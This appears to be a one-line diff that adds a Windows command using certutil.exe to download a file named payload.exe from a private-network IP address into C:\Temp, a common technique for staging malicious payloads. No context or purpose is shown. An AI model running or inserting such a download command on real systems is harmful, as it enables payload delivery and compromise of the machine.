@@ -1,0 +1,1 @@
+certutil.exe -urlcache -split -f http://192.168.65.151/payload.exe C:\Temp\payload.exe
